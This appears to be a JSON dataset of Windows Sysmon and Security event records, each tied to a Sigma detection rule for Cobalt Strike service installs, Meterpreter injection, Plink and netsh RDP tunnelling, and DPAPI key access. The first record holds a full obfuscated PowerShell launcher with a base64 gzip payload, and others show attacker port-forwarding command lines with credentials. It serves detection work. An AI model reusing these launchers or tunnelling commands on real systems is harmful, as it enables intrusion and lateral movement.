[
  {
    "Rule level": "critical",
    "title": "CobaltStrike Service Installations in Registry",
    "sigma_yml": "registry_set_cobaltstrike_service_installs.yml",
    "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement. We can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml) In some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon's events.",
    "row_id": 35910,
    "Image": "C:\\Windows\\system32\\services.exe",
    "ProcessGuid": "365ABB72-2586-5CC9-0000-0010DC530000",
    "ProcessId": 1964,
    "UtcTime": "2019-04-30 20:26:51.934",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 13,
    "EventRecordID": 9806,
    "ThreadID": 1664,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 13,
    "SystemTime": "2019-04-30T20:26:51.981089Z",
    "Version": 2,
    "OriginalLogfile": "LM_sysmon_psexec_smb_meterpreter.evtx-7IOZ83SP.json",
    "Details": "%%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
    "EventType": "SetValue",
    "TargetObject": "HKLM\\System\\CurrentControlSet\\services\\hello\\ImagePath"
  },
  {
    "Rule level": "high",
    "title": "Rundll32 Without Parameters",
    "sigma_yml": "proc_creation_win_rundll32_without_parameters.yml",
    "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module",
    "row_id": 36142,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "ProcessGuid": "365ABB72-1282-5D1D-0000-0010DD401B00",
    "ProcessId": 112,
    "UtcTime": "2019-07-03 20:39:30.254",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 1,
    "EventRecordID": 8352,
    "ThreadID": 2084,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-07-03T20:39:30.254733Z",
    "Version": 5,
    "OriginalLogfile": "Sysmon_meterpreter_ReflectivePEInjection_to_notepad_.evtx-9LYW63G3.json",
    "CommandLine": "rundll32.exe",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Users\\IEUser\\",
    "Description": "Windows host process (Rundll32)",
    "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
    "Hashes": "SHA1=892503B20247B341CFD20DDA5FDACFA41527A087,MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670,IMPHASH=239D911DFA7551A8B735680BC39B2238",
    "IntegrityLevel": "Medium",
    "LogonGuid": "365ABB72-0A6F-5D1D-0000-0020CA350100",
    "LogonId": "0x135ca",
    "ParentCommandLine": "\"C:\\Windows\\system32\\notepad.exe\" ",
    "ParentImage": "C:\\Windows\\System32\\notepad.exe",
    "ParentProcessGuid": "365ABB72-1256-5D1D-0000-0010FB1A1B00",
    "ParentProcessId": 1632,
    "Product": "Microsoft速 Windows速 Operating System",
    "TerminalSessionId": 1,
    "User": "IEWIN7\\IEUser"
  },
  {
    "Rule level": "high",
    "title": "Suspicious Plink Remote Forwarding",
    "sigma_yml": "proc_creation_win_susp_plink_remote_forward.yml",
    "description": "Detects suspicious Plink tunnel remote forarding to a local port",
    "row_id": 35930,
    "Image": "C:\\Users\\IEUser\\Desktop\\plink.exe",
    "ProcessGuid": "365ABB72-DFAD-5C67-0000-0010E0811500",
    "ProcessId": 1728,
    "UtcTime": "2019-02-16 10:02:21.934",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "PC01.example.corp",
    "EventID": 1,
    "EventRecordID": 1940899,
    "ThreadID": 412,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-02-16T10:02:21.934438Z",
    "Version": 5,
    "OriginalLogfile": "DE_sysmon-3-rdp-tun.evtx-MYP0F05E.json",
    "CommandLine": "plink.exe  10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127.0.0.2:3389 -l test -pw test",
    "Company": "Simon Tatham",
    "CurrentDirectory": "C:\\Users\\IEUser\\Desktop\\",
    "Description": "Command-line SSH, Telnet, and Rlogin client",
    "FileVersion": "Release 0.70",
    "Hashes": "SHA1=7806AD24F669CD8BB9EBE16F87E90173047F8EE4",
    "IntegrityLevel": "High",
    "LogonGuid": "365ABB72-D6AB-5C67-0000-002056660200",
    "LogonId": "0x26656",
    "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" ",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessGuid": "365ABB72-D92A-5C67-0000-0010CB580900",
    "ParentProcessId": 3904,
    "Product": "PuTTY suite",
    "TerminalSessionId": 1,
    "User": "PC01\\IEUser"
  },
  {
    "Rule level": "high",
    "title": "Netsh RDP Port Forwarding",
    "sigma_yml": "proc_creation_win_netsh_port_fwd_3389.yml",
    "description": "Detects netsh commands that configure a port forwarding of port 3389 used for RDP",
    "row_id": 35535,
    "Image": "C:\\Windows\\System32\\netsh.exe",
    "ProcessGuid": "365ABB72-DC5C-5CE6-0000-001066E27200",
    "ProcessId": 2032,
    "UtcTime": "2019-05-23 17:46:04.651",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 1,
    "EventRecordID": 1026,
    "ThreadID": 2092,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-05-23T17:46:04.671625Z",
    "Version": 5,
    "OriginalLogfile": "de_portforward_netsh_rdp_sysmon_13_1.evtx-KBPYGOJ5.json",
    "CommandLine": "netsh  I p a v l=8001 listena=1.2.3.4 connectp=3389 c=1.2.3.5",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "c:\\",
    "Description": "Network Command Shell",
    "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
    "Hashes": "SHA1=7DA1852DF83C58841AD35248AD2A20D7FFBB7FA0,MD5=784A50A6A09C25F011C3143DDD68E729,SHA256=661F5D4CE4F0A6CB32669A43CE5DEEC6D5A9E19B2387F22C5012405E92169943,IMPHASH=33B8120C37D7861778989FBFD16214E1",
    "IntegrityLevel": "High",
    "LogonGuid": "365ABB72-CE6C-5CE6-0000-002047F30000",
    "LogonId": "0xf347",
    "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" ",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessGuid": "365ABB72-DC3E-5CE6-0000-00102BC97200",
    "ParentProcessId": 712,
    "Product": "Microsoft速 Windows速 Operating System",
    "TerminalSessionId": 1,
    "User": "IEWIN7\\IEUser"
  },
  {
    "Rule level": "high",
    "title": "Protected Storage Service Access",
    "sigma_yml": "win_protected_storage_service_access.yml",
    "description": "Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers",
    "row_id": 531,
    "ProcessId": 4,
    "Channel": "Security",
    "Computer": "01566s-win16-ir.threebeesco.com",
    "EventID": 5145,
    "EventRecordID": 886983,
    "ThreadID": 868,
    "Keywords": "0x8020000000000000",
    "Level": 0,
    "Opcode": 0,
    "Guid": "54849625-5478-4994-A5BA-3E3B0328C30D",
    "Provider_Name": "Microsoft-Windows-Security-Auditing",
    "Task": 12811,
    "SystemTime": "2020-07-19T13:06:52.199855Z",
    "Version": 0,
    "OriginalLogfile": "CA_protectedstorage_5145_rpc_masterkey.evtx-X1ICHCAH.json",
    "SubjectDomainName": "3B",
    "SubjectLogonId": "0x4e5197",
    "SubjectUserName": "backdoor",
    "SubjectUserSid": "S-1-5-21-308926384-506822093-3341789130-107103",
    "AccessList": "%%1538\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4416\r\n\t\t\t\t%%4417\r\n\t\t\t\t%%4418\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4420\r\n\t\t\t\t%%4423\r\n\t\t\t\t%%4424\r\n\t\t\t\t",
    "AccessMask": "0x12019f",
    "ObjectType": "File",
    "IpAddress": "172.16.66.1",
    "IpPort": "52415",
    "ShareName": "\\\\*\\IPC$",
    "AccessReason": "-",
    "RelativeTargetName": "protected_storage"
  }
]